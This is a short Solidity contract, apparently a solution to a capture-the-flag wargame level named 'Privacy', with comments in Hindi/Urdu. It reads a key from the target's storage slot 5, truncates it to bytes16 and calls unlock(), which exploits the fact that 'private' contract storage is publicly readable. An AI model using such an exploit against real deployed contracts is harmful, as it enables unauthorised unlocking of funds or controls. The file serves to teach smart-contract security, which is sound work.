// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract PrivacyAttack {
    IPrivacy public target;

    constructor(address _targetAddress) {
        target = IPrivacy(_targetAddress);
    }

    // Is function mein hum blockchain slot 5 se mili hui 32-byte key ko bytes16 mein cast kar ke unlock call karte hain
    function attack(bytes32 _slotValue) external {
        // bytes32 ko bytes16 mein cast karne se pehle 16 bytes extract ho jate hain
        bytes16 key = bytes16(_slotValue);
        target.unlock(key);
    }
}